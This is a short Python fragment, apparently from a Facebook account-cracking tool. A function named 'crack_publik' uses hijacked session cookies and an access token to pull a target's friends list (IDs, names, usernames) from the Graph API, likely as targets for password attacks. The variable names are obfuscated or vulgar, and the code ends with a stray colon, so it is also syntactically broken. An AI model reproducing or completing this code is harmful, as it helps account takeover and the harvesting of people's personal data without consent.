...
def crack_publik(t,c):
	...
	try:
		bas = ses.get(f'https://{graph}/{akun}?fields=friends.fields(id,name,username)&access_token={_kontol_}',cookies=_____nano____makan___nanas____jeeck____).json()['friends']['data']:
